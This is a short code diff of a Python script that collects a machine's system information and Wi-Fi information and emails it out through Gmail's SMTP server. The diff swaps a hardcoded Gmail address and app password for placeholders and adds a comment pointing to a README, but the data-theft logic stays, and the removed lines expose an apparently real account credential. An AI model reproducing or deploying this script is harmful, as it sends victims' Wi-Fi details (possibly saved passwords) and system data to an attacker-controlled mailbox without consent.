@@ -29,12 +29,12 @@ def systeminfo_captured():
 def main():
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.starttls()
-    server.login('mihadac681@gmail.com', 'xssdkdizoqktjfba')
+    server.login('username@gmail.com', 'password') #don't use you gmail password, read READme.txt file first 
 
     systeminfo: str = systeminfo_captured()
     capturewifi: str = capture_wifi()
     message: str = f'system info: \n{systeminfo}\n\nwifi info: \n\n{capturewifi}'
-    server.sendmail('mihadac681@gmail.com', 'mihadac681@gmail.com', message)
+    server.sendmail('username@gmail.com', 'username@gmail.com', message)
 
 
 if __name__ == '__main__':
